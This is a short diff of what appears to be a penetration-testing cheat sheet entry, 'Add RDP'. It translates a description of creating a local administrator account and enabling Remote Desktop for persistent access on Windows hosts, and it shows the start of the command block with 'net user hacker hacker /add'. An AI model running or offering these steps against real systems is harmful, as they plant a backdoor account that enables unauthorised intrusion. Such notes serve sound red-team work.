@@ -4,7 +4,7 @@ title: "Add RDP"
 
 # Add RDP
 
-Criação de usuário local com privilégios de administrador e Remote Desktop User, habilitando RDP via registro e firewall. Útil para manter acesso persistente e interativo em hosts Windows.
+Creates a local admin user with Remote Desktop User privileges and enables RDP via registry and firewall. Useful for maintaining persistent and interactive access on Windows hosts.
 
 ```shell
 net user hacker hacker /add
